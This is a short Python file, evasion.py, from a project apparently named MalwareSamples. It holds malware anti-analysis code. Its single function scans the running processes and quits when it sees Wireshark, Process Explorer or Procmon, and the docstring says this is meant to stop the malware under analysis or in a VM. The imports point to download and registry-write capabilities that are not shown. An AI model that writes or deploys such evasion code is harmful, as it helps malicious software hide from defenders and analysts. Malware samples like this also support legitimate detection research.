"""
   Copyright (c) 2019 Jack Farley
   This file is part of MalwareSamples
   Usage or distribution of this software/code is subject to the
   terms of the GNU GENERAL PUBLIC LICENSE.
   evasion.py
   ---
"""

from zipfile import ZipFile
import io
import os
import requests
import sys
from winreg import OpenKey, HKEY_CURRENT_USER, KEY_WRITE, REG_SZ, SetValueEx, CloseKey


import psutil

def ProcessEvasion():
    '''
            Kill malware if we see that analysis tools are being used or in a VM
    '''


    process_name = ["Wireshark.exe", "procexp64.exe", "procexp.exe", "procmon.exe"]

    # Iterate over the all the running process
    for proc in psutil.process_iter():
        try:
            pinfo = proc.as_dict(attrs=['pid', 'name', 'create_time'])
            # Check if process name contains the given name string.
            for process in process_name:
                if process.lower() in pinfo['name'].lower():
                    sys.exit()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass